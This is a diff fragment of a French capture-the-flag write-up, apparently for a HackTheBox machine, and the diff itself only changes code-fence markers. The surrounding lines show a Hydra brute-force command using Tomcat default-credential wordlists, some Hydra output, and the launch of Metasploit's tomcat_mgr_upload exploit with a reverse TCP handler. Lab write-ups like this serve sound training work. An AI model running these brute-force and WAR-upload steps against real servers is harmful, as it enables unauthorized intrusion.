@@ -17,7 +17,7 @@ On trouve facilement [une liste de mots de passe par défaut](https://github.com
 
 On peut bruteforcer l'accès à la section manager via le module Metasploit *scanner/http/tomcat\_mgr\_login* ou encore via Hydra en espérant que le mot de passe n'a pas été préalablement changé :  
 
-```plain
+```
 $ hydra -P  /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt http-get://10.10.10.95:8080/manager/html
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -32,7 +32,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2018-07-01 13:28:13
 
 Dès lors on peut exploiter le Tomcat par l'upload d'un fichier WAR spécifique, ce que fait très bien Metasploit pour nous :  
 
-```plain
+```
 msf exploit(multi/http/tomcat_mgr_upload) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.35:443
